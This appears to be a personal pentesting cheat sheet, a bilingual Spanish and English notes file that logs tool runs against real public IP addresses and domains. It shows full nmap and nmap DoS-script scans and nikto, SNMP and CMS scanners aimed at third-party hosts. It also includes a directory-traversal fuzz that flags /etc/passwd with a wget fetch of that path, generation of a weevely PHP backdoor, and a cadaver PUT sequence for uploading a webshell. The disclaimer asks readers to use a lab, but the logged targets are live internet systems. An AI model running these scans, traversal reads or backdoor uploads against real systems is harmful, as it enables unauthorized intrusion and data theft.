<img src="https://cdn.pixabay.com/photo/2013/07/13/11/43/tux-158547_960_720.png"/>

# Descargo de responsabilidad
La finalidad de este fichero es recopilar información actualizada mientras aprendo pentesting, hardening y 
seguridad informática en definitiva. Por favor, no uses este conocimiento para cometer actos ilegales, por lo que 
yo no me hago responsable de las acciones ilegales que puedas cometer. 

Usa estos comandos en un laboratorio controlado, por ejemplo, ejecutando distintas máquinas virtuales en vmware o virtualbox,
o en las máquinas que provee hackthebox. Están diseñadas para ser divertidas de hackear mientras aprendes.
Un gran poder conlleva una gran responsabilidad, procura ser un agente del bien.

Actualmente el fichero está disgregado, verás distintos ejemplos de la misma herramienta por aquí y por allá. 
Está hecho así a proposito, algún día, cuando tenga mucho material actualizado acumulado, dentro de unos años, lo dejaré bien ordenado.
También me gustaría que este trabajo llegue algún a las manos de Israel, la persona de quien forkeé el original. 
Estoy aprendiendo de él y de otros más como Santiago Hernandez y S4vitar.
En estos momentos voy agregando lo último que voy viendo al principio del fichero.

# Disclaimer
The purpose of this file is to collect updated information while I learn pentesting,hardening cloud systems and
cybersecurity . Please do not use this knowledge to commit illegal acts, so i am not responsible for any illegal 
actions you may commit.

Use these commands in a controlled lab, for example running different virtual machines on vmware or virtualbox,
or on machines provided by hackthebox. They are designed to be fun to hack while you learn.

# Bypass a Web application Firewall, like CloudFlare...

    You need to identify what waf are behind any server, so you can use somethig like wafw00f.
    https://www.kali.org/tools/wafw00f/
    
    then, i recommend to go to this website and find the latest hack:
    https://waf-bypass.com
    
# Find javascript files from a malicious webserver.

    https://github.com/bhavik-kanejiya/SecretFinder
    
    zsh 6551 [1] master% python3 -m pip install -r requirements.txt
    Collecting requests_file
      Downloading requests_file-1.5.1-py2.py3-none-any.whl (3.7 kB)
    ...
    Successfully built jsbeautifier
    Installing collected packages: editorconfig, requests-file, jsbeautifier
    Successfully installed editorconfig-0.12.3 jsbeautifier-1.14.5 requests-file-1.5.1
    (base) [sáb 22/08/13 12:51 CEST][s000][x86_64/darwin21.0/21.6.0][5.8.1]
    <aironman@MacBook-Pro-de-Alonso:~/git/SecretFinder>
    zsh 6552 master% python3 SecretFinder.py -i https://www.metanoa.vip/\#/ -e 
    [ + ] URL: https://www.metanoa.vip//./static/js/manifest.f4f4a9a7742499ed15ad.js
    [ + ] URL: https://www.metanoa.vip//./static/js/vendor.a8be22dfe66398d155ce.js
    [ + ] URL: https://www.metanoa.vip//./static/js/app.a45df6fa2d6c8283993c.js
    
    Then, we can use https://beautifier.io to deobfsucate the javascript code and analyze it.
    
    Looking for something like https, i can see an url, h5.metanoa.vip, lets ping it:
    
    <aironman@MacBook-Pro-de-Alonso:~/git/SecretFinder>
    zsh 6554 master% ping -c 1 h5.metanoa.vip                                                                      
    PING h5.metanoa.vip (156.240.105.170): 56 data bytes
    64 bytes from 156.240.105.170: icmp_seq=0 ttl=49 time=338.158 ms

    --- h5.metanoa.vip ping statistics ---
    1 packets transmitted, 1 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 338.158/338.158/338.158/0.000 ms
    
    h5.metanoa.vip looks different from https://www.metanoa.vip/\#/, so probably is the real ip address.
    
    Using this tool, i can see that the ip is located in Hong Kong, and it is static, probably it is the real ip address.
    
    https://whatismyipaddress.com/ip/156.240.105.170
    
    If i ping the other ip address:
    
    <aironman@MacBook-Pro-de-Alonso:~/git/SecretFinder>
    zsh 6557 [68] master% ping -c 1 www.metanoa.vip 
    PING www.metanoa.vip (156.240.105.170): 56 data bytes
    64 bytes from 156.240.105.170: icmp_seq=0 ttl=49 time=253.263 ms

    --- www.metanoa.vip ping statistics ---
    1 packets transmitted, 1 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 253.263/253.263/253.263/0.000 ms
    
    probably it is not behind any fancy web firewall.
    
# Pasos de Israel (@perito_inf) para realizar un proceso de pentesting.

    https://twitter.com/perito_inf/status/1178741955561492481
    
# ESCANEO DE LA RED
    
    > nmap -sn 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:32 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.17s latency).
    Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
    ...
    
    >  nmap -sL 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:31 CEST
    Nmap scan report for 156.242.11.17
    Nmap done: 1 IP address (0 hosts up) scanned in 0.05 seconds
    ...
    
    > nbtscan -r  156.242.11.17/24
    Doing NBT name scan for addresses from 156.242.11.17/24

    IP address       NetBIOS Name     Server    User             MAC address      
    ------------------------------------------------------------------------------
    156.242.11.18    MS01-C6220-DS07  <server>  <unknown>        e0:db:55:fd:91:e6
    156.242.11.14    MS01-5038ML-018  <server>  <unknown>        ac:1f:6b:f2:7e:4d

    # smbtree - A text based smb network browser. Windows only
    
        smbtree
    
    # Netdiscover es una herramienta activa/pasiva para el reconocimiento de direcciones, desarrollada 
    # principalmente para redes inalámbricas sin   servidor dhcp, cuando se está realizando wardriving. 
    # Y también puede ser utilizada en redes con hub o switch.

    # Construido sobre libnet y libcap, puede detectar de manera pasiva hosts en funcionamiento, o búsqueda 
    # de ellos, enviando solicitudes ARP, esto también puede ser utilizado para inspeccionar el tráfico de red
    # ARP, o encontrar direcciones de red utilizando el modo de auto escaneo, lo cual puede escanear por redes 
    # locales comunes.
    
    # Aquí estoy usando la herramienta como un sniffer de mi red local...
    
    > sudo netdiscover -P -i eth0 -r 192.168.85.0/24
     _____________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
     -----------------------------------------------------------------------------
     192.168.85.1    a6:83:e7:39:c4:65      1      60  Unknown vendor
     192.168.85.2    00:50:56:e5:34:24      1      60  VMware, Inc.
     192.168.85.254  00:50:56:e3:1d:c6      1      60  VMware, Inc.

    -- Active scan completed, 3 Hosts found.

    
    ESCANEO AL HOST. 
    
    Veinte puertos abiertos más importantes.
    
    > nmap --top-ports 20 --open 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:37 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 17 filtered tcp ports (no-response), 1 closed tcp port (conn-refused)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT    STATE SERVICE
    80/tcp  open  http
    443/tcp open  https
    ...
    
    > echo 156.242.11.17 > iplist.txt
    > cat iplist.txt
    156.242.11.17
    > nmap --top-ports  20 --open -iL iplist.txt
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:40 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.19s latency).
    Not shown: 17 filtered tcp ports (no-response), 1 closed tcp port (conn-refused)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT    STATE SERVICE
    80/tcp  open  http
    443/tcp open  https

    Nmap done: 1 IP address (1 host up) scanned in 3.21 seconds

    # deep, maybe 1 hour!
    
    > sudo nmap -p- -sS -A -sV -O  -iL iplist.txt
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 12:41 CEST
    Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 0.94% done                                                                                                                           ...             
    Stats: 0:31:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 60.01% done; ETC: 13:34 (0:20:58 remaining)                                                                                                                                    
    Stats: 0:43:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                                                                                               
    SYN Stealth Scan Timing: About 83.71% done; ETC: 13:34 (0:08:31 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.068s latency).
    Not shown: 65519 filtered tcp ports (no-response)
    PORT      STATE  SERVICE   VERSION
    22/tcp    closed ssh
    80/tcp    open   http      nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    443/tcp   open   ssl/http  nginx
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-alpn: 
    |_  http/1.1
    | tls-nextprotoneg: 
    |_  http/1.1
    2052/tcp  closed clearvisn
    2053/tcp  closed knetd
    2082/tcp  closed infowave
    2083/tcp  open   ssl/http  nginx
    | ssl-cert: Subject: commonName=CloudFlare Origin Certificate/organizationName=CloudFlare, Inc.
    | Subject Alternative Name: DNS:*.defi-aava.xyz, DNS:defi-aava.xyz
    | Not valid before: 2022-03-11T06:50:00
    |_Not valid after:  2037-03-07T06:50:00
    | http-title: 400 The plain HTTP request was sent to HTTPS port
    |_Requested resource was /index/index/welcome
    | tls-nextprotoneg: 
    |_  http/1.1
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    23323/tcp open   http      nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    23324/tcp open   ssl/http  nginx
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg: 
    |_  http/1.1
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    23325/tcp open   http      nginx
    | http-title: \xE6\xAC\xA2\xE8\xBF\x8E\xE8\xAE\xBF\xE9\x97\xAEAI\xE6\x99\xBA\xE8\x83\xBD\xE5\xAE\xA2\xE6\x9C\x8D\xE7\xB3\xBB\xE7\xBB\x9F
    |_Requested resource was /index/index/welcome
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    23326/tcp open   ssl/http  nginx
    | tls-alpn: 
    |_  http/1.1
    | tls-nextprotoneg: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | http-title: 400 The plain HTTP request was sent to HTTPS port
    |_Requested resource was /index/index/welcome
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    23327/tcp open   unknown
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, RPCCheck, RTSPRequest, SSLSessionReq: 
    |     HTTP/1.1 400 Bad Request
    |     <b>400 Bad Request</b><br>Invalid handshake data for websocket. <br> See <a href="http://wiki.workerman.net/Error1">http://wiki.workerman.net/Error1</a> for detail.
    |   GetRequest: 
    |     HTTP/1.1 400 Bad Request
    |_    <b>400 Bad Request</b><br>Sec-WebSocket-Key not found.<br>This is a WebSocket service and can not be accessed via HTTP.<br>See <a href="http://wiki.workerman.net/Error1">http://wiki.workerman.net/Error1</a> for detail.
    32200/tcp open   ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 6e:53:7f:f6:97:fa:9e:a5:b8:75:57:80:94:d2:35:19 (RSA)
    |   256 80:9e:85:1e:ff:f8:55:64:32:62:9d:85:ac:7c:e8:64 (ECDSA)
    |_  256 c0:b4:c7:01:ae:77:53:93:af:f7:d7:59:ab:3e:67:6c (ED25519)
    32201/tcp open   http      nginx
    | http-title: \xE6\xAC\xA2\xE8\xBF\x8E\xE8\xAE\xBF\xE9\x97\xAEAI\xE6\x99\xBA\xE8\x83\xBD\xE5\xAE\xA2\xE6\x9C\x8D\xE7\xB3\xBB\xE7\xBB\x9F
    |_Requested resource was /index/index/welcome
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    32202/tcp open   http      nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    40000/tcp open   ssl/http  nginx
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg: 
    |_  http/1.1
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port23327-TCP:V=7.92%I=7%D=8/16%Time=62FB80CA%P=x86_64-pc-linux-gnu%r(G
    SF:etRequest,F6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x
    SF:20Request</b><br>Sec-WebSocket-Key\x20not\x20found\.<br>This\x20is\x20a
    SF:\x20WebSocket\x20service\x20and\x20can\x20not\x20be\x20accessed\x20via\
    SF:x20HTTP\.<br>See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">h
    SF:ttp://wiki\.workerman\.net/Error1</a>\x20for\x20detail\.")%r(HTTPOption
    SF:s,C0,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x20Reques
    SF:t</b><br>Invalid\x20handshake\x20data\x20for\x20websocket\.\x20<br>\x20
    SF:See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">http://wiki\.w
    SF:orkerman\.net/Error1</a>\x20for\x20detail\.")%r(RTSPRequest,C0,"HTTP/1\
    SF:.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x20Request</b><br>Inva
    SF:lid\x20handshake\x20data\x20for\x20websocket\.\x20<br>\x20See\x20<a\x20
    SF:href=\"http://wiki\.workerman\.net/Error1\">http://wiki\.workerman\.net
    SF:/Error1</a>\x20for\x20detail\.")%r(RPCCheck,C0,"HTTP/1\.1\x20400\x20Bad
    SF:\x20Request\r\n\r\n<b>400\x20Bad\x20Request</b><br>Invalid\x20handshake
    SF:\x20data\x20for\x20websocket\.\x20<br>\x20See\x20<a\x20href=\"http://wi
    SF:ki\.workerman\.net/Error1\">http://wiki\.workerman\.net/Error1</a>\x20f
    SF:or\x20detail\.")%r(DNSVersionBindReqTCP,C0,"HTTP/1\.1\x20400\x20Bad\x20
    SF:Request\r\n\r\n<b>400\x20Bad\x20Request</b><br>Invalid\x20handshake\x20
    SF:data\x20for\x20websocket\.\x20<br>\x20See\x20<a\x20href=\"http://wiki\.
    SF:workerman\.net/Error1\">http://wiki\.workerman\.net/Error1</a>\x20for\x
    SF:20detail\.")%r(DNSStatusRequestTCP,C0,"HTTP/1\.1\x20400\x20Bad\x20Reque
    SF:st\r\n\r\n<b>400\x20Bad\x20Request</b><br>Invalid\x20handshake\x20data\
    SF:x20for\x20websocket\.\x20<br>\x20See\x20<a\x20href=\"http://wiki\.worke
    SF:rman\.net/Error1\">http://wiki\.workerman\.net/Error1</a>\x20for\x20det
    SF:ail\.")%r(Help,C0,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20
    SF:Bad\x20Request</b><br>Invalid\x20handshake\x20data\x20for\x20websocket\
    SF:.\x20<br>\x20See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">h
    SF:ttp://wiki\.workerman\.net/Error1</a>\x20for\x20detail\.")%r(SSLSession
    SF:Req,C0,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<b>400\x20Bad\x20Requ
    SF:est</b><br>Invalid\x20handshake\x20data\x20for\x20websocket\.\x20<br>\x
    SF:20See\x20<a\x20href=\"http://wiki\.workerman\.net/Error1\">http://wiki\
    SF:.workerman\.net/Error1</a>\x20for\x20detail\.");
    Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (98%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (97%), Linux 4.4 (97%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Microsoft Windows XP SP3 (95%), BlueArc Titan 2100 NAS device (91%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   57.46 ms 192.168.85.2
    2   51.12 ms 156.242.11.17

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 3192.48 seconds

    ⭐  ~  ok  took 53m 13s  at 13:35:12 >  
     
    > nmap sU -iL iplist.txt
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 13:47 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds

    ⭐  ~  ok  took 12s  at 13:47:47 >  

    # ESCANEO DE LOS SERVICIOS

    # SERVICIOS WEB
    
    # Nikto
        
        https://ciberseguridad.com/herramientas/software/nikto/#Instalacion_basada_en_Kali_Linux
        
    > sudo nikto -h 156.242.11.17 -ssl -maxtime 60 -output nikto-156-242-11-17.txt -no404 -timeout 15
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          156.242.11.17
    + Target Hostname:    156.242.11.17
    + Target Port:        443
    ---------------------------------------------------------------------------
    + SSL Info:        Subject:  /CN=www.aavadefimax.xyz
                       Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                       Issuer:   /C=US/O=Let's Encrypt/CN=R3
    + Start Time:         2022-08-16 12:55:45 (GMT2)
    ---------------------------------------------------------------------------
    + Server: nginx
    + Retrieved x-powered-by header: PHP/7.2.34
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    + The site uses SSL and Expect-CT header is not present.
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + ERROR: Host maximum execution time of 60 seconds reached
    + SCAN TERMINATED:  0 error(s) and 6 item(s) reported on remote host
    + End Time:           2022-08-16 12:56:49 (GMT2) (64 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested
    
    # I generated an output file with -output:
    
    > cat nikto-156-242-11-17.txt
    - Nikto v2.1.6/2.1.5
    + Target Host: 156.242.11.17
    + Target Port: 443
    + GET Retrieved x-powered-by header: PHP/7.2.34
    + GET The anti-clickjacking X-Frame-Options header is not present.
    + GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    + GET The site uses SSL and Expect-CT header is not present.
    + GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type

     ⭐  ~  ok  at 12:59:33 >                                                                                           
    
    # dotdotpwn. 
    
        https://www.kali.org/tools/dotdotpwn/
        
    > sudo dotdotpwn -m http -h 156.242.11.17 -M GET -b -q -r host_156_242_11_17.txt -t 100
    #################################################################################
    #                                                                               #
    #  CubilFelino                                                       Chatsubo   #
    #  Security Research Lab              and            [(in)Security Dark] Labs   #
    #  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
    #                                                                               #
    #                               pr0udly present:                                #
    #                                                                               #
    #  ________            __  ________            __  __________                   #
    #  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
    #   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
    #   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
    #  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
    #          \/                      \/                                      \/   #
    #                              - DotDotPwn v3.0.2 -                             #
    #                         The Directory Traversal Fuzzer                        #
    #                         http://dotdotpwn.sectester.net                        #
    #                            dotdotpwn@sectester.net                            #
    #                                                                               #
    #                               by chr1x & nitr0us                              #
    #################################################################################

    [+] Report name: Reports/host_156_242_11_17.txt

    [========== TARGET INFORMATION ==========]
    [+] Hostname: 156.242.11.17
    [+] Protocol: http
    [+] Port: 80

    [=========== TRAVERSAL ENGINE ===========]
    [+] Creating Traversal patterns (mix of dots and slashes)
    [+] Multiplying 6 times the traversal patterns (-d switch)
    [+] Creating the Special Traversal patterns
    [+] Translating (back)slashes in the filenames
    [+] Adapting the filenames according to the OS type detected (unix)
    [+] Including Special sufixes
    [+] Traversal Engine DONE ! - Total traversal tests created: 11028

    [=========== TESTING RESULTS ============]
    [+] Ready to launch 10.00 traversals per second
    [+] Press Enter to start the testing (You can stop it pressing Ctrl + C)
    ...
    [*] Testing Path: http://156.242.11.17:80/.?/etc/passwd <- VULNERABLE!

    [+] Fuzz testing finished after 12.10 minutes (726 seconds)
    [+] Total Traversals found: 1
    [+] Report saved: Reports/host_156_242_11_17.txt
    > wget http://156.242.11.17:80/.\?/etc/passwd
    --2022-08-16 16:40:17--  http://156.242.11.17/?/etc/passwd
    Connecting to 156.242.11.17:80... connected.
    HTTP request sent, awaiting response... 200 OK
    ...
    
    view source ??? preguntar a Isra
    
    # davtest
    
        You can upload files to a vulnerable webdav server using this.
        WebDav se usa para compartir ficheros en un servidor web, como un ftp, pero sobre la web.
        
        El protocolo WebDAV (Web-based Distributed Authoring and Versioning) está desarrollado por la IETF, 
        es un protocolo que se encarga de permitirnos de forma sencilla guardar, editar, copiar, mover y 
        compartir archivos desde servidores web. Gracias a este protocolo, podremos trabajar con archivos 
        directamente en un servidor web, como si de un servidor Samba o FTP se tratara. 
        
        Actualmente, la mayoría de sistemas operativos modernos como Windows, Linux o macOS, permiten soporte 
        para WebDAV, haciendo que los ficheros de un servidor WebDAV aparezcan como almacenados en un directorio. 
        
        https://www.kali.org/tools/davtest/
        
        Tienes que crear un directorio tests, si no, falla.
        ┌──(root㉿kali)-[/home/kali]
        └─# mkdir tests                      

        ┌──(root㉿kali)-[/home/kali]
        └─# davtest -url http://156.242.11.17
        ********************************************************
         Testing DAV connection
        OPEN            FAIL:   http://156.242.11.17    Server response: 405 Not Allowed
        
        Como puedes ver, ese servidor no tiene webdav habilidato, por lo que, tenemos que detectar servidores web con
        webdav habilitado. Nmap tiene un script llamado http-iis-webdav-vuln
        
        ┌──(root㉿kali)-[/home/kali]
        └─# nmap -T4 -p80 --script=http-iis-webdav-vuln 156.242.11.17
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 14:11 CEST
        Nmap scan report for 156.242.11.17
        Host is up (0.040s latency).

        PORT   STATE SERVICE
        80/tcp open  http

        Nmap done: 1 IP address (1 host up) scanned in 2.01 seconds

        ┌──(root㉿kali)-[/home/kali]
        └─# nmap -T4 -p443 --script=http-iis-webdav-vuln 156.242.11.17
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 14:12 CEST
        Nmap scan report for 156.242.11.17
        Host is up (0.040s latency).

        PORT    STATE SERVICE
        443/tcp open  https

        Nmap done: 1 IP address (1 host up) scanned in 2.16 seconds
        
        Como podemos ver, este servidor NO es vulnerable.
        
        Si buscamos con Shodan, vemos un montón.
        
        https://beta.shodan.io/search?query=%28Win32%29+DAV%2F2
        
        
    # weevely
    
        Generate a PHP backdoor (generate) protected with the given password (s3cr3t).
        
        https://www.kali.org/tools/weevely/
        
        > sudo weevely generate 123321 /home/kali/Desktop/fake-log-weevely.php
        Generated '/home/kali/Desktop/fake-log-weevely.php' with password '123321' of 754 byte size.

    # cadaver
        
        si encuentras un servidor web dav vulnerable, es decir, una máquina donde puedas subir ficheros, puedes subir un webshell
        que te de acceso a la máquina. Lo encuentras con nikto, generas la webshell con weevely, lo subes con cadaver.
        
        Voy a simular como sería, encuentro un servidor vulnerable donde puedo subir ficheros. Si el siguiente lo fuera, me diría que puedo
        hacer PUT...
        > sudo nikto -h http://78.54.214.92/dav
        - Nikto v2.1.6
        ---------------------------------------------------------------------------
        + No web server found on 78.54.214.92:80
        ---------------------------------------------------------------------------
        + 0 host(s) tested

        # Si el servidor estuviera arriba, podrías hacer PUT del fichero generado con weeverly.
        
        > sudo cadaver http://78.54.214.92/dav
        Could not connect to `78.54.214.92' on port 80:
        Could not connect to server: Connection refused
        dav:/dav/? PUT /home/kali/Desktop/fake-log-weevely.php
        The `PUT' command can only be used when connected to the server.
        Try running `open' first (see `help open' for more details).
        dav:/dav/?
        
    # droopscan
        
        drupal scanner...

        > sudo droopescan scan drupal -u 18.232.209.104
        [sudo] password for kali: 
        [+] Plugins found:                                                              
            acquia_connector http://18.232.209.104/sites/all/modules/acquia_connector/
                http://18.232.209.104/sites/all/modules/acquia_connector/README.txt
            image http://18.232.209.104/modules/image/

        [+] Themes found:
            garland http://18.232.209.104/themes/garland/

        [+] Possible version(s):
            7.22
            7.23
            7.24
            7.25
            7.26
            7.27
            7.28
            7.29
            7.30
            7.31
            7.32
            7.33
            7.34
            7.35
            7.36
            7.37
            7.38
            7.39
            7.40
            7.41
            7.42
            7.43
            7.44
            7.50
            7.51
            7.52
            7.53
            7.54
            7.55
            7.56
            7.57
            7.58
            7.59
            7.60
            7.61
            7.62
            7.63
            7.64
            7.65
            7.66
            7.67
            7.68
            7.69
            7.70
            7.71
            7.72
            7.73
            7.74
            7.75
            7.76
            7.77
            7.78
            7.79
            7.80
            7.81
            7.82

        [+] No interesting urls found.

        [+] Scan finished (0:02:25.852120 elapsed)

        ⭐  ~  ok  took 2m 29s  at 10:48:49 >  
    
    # joomscan
    
        joomla scanner

      > sudo joomscan -u 114.34.51.108  -ec --timeout 1000
            ____  _____  _____  __  __  ___   ___    __    _  _ 
       (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
      .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
      \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                            (1337.today)

        --=[OWASP JoomScan
        +---++---==[Version : 0.0.7
        +---++---==[Update Date : [2018/09/23]
        +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
        --=[Code name : Self Challenge
        @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

    Processing http://114.34.51.108 ...

    [+] FireWall Detector
    [++] Firewall not detected

    [+] Detecting Joomla Version
    [++] ver 404


    [+] Core Joomla Vulnerability                                                                                                                                                                             
    [++] Target Joomla core is not vulnerable                                    

    # LFI\RFI Test
        
        https://www.extrasoft.es/lfi-rfi-vulnerabilidades-en-paginas-web-3/

        
    # S.O. LINUX/WINDOWS
    
    sudo snmpwalk -c public -v1 91.195.80.226 1
    
    > sudo snmpwalk -v1 -c public 91.195.80.226
    iso.3.6.1.2.1.1.1.0 = STRING: "APC Web/SNMP Management Card (MB:v4.1.1 PF:v3.9.2 PN:apc_hw02_aos_392.bin AF1:v3.9.2 AN1:apc_hw02_rpdu_392.bin MN:AP7920 HR:B2 SN: ZA0609020383 MD:02/24/2006) "

    smbclient -L //ipaddress
    showmount -e ipaddress port
    
    # rpcinfo. rpcinfo makes an RPC call to an RPC server and reports what it finds.
    
        https://www.computerhope.com/unix/urpcinfo.htm#examples
        
    # Enum4Linux
        
        https://www.kali.org/tools/enum4linux/
        
        Enum4linux is a tool for enumerating information from Windows and Samba systems. 
        It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com.
        
    # OTROS
    
    # nmap script engine (nse)
    
    https://nmap.org/book/man-nse.html
    
    13 categories: auth, broadcast, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln
    
    > nmap -script dos  --webxml -oA nmap-156.242.11.17 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:27 CEST
    Stats: 0:00:16 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
    Parallel DNS resolution of 1 host. Timing: About 0.00% done
    Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 0.79% done

    > nmap -script discovery  --webxml -oA nmap-156.242.11.17-discovery 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:33 CEST
    Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 94.29% done; ETC: 18:33 (0:00:00 remaining)
    Pre-scan script results:
    | targets-asn: 
    |_  targets-asn.asn is a mandatory parameter
    |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/

    > nmap -script default  --webxml -oA nmap-156.242.11.17-default 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:39 CEST
    Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 40.10% done; ETC: 18:39 (0:00:13 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    443/tcp open   https
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg: 
    |_  http/1.1
    | tls-alpn: 
    |_  http/1.1
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    |_ssl-date: TLS randomness does not represent time

    Nmap done: 1 IP address (1 host up) scanned in 22.30 seconds

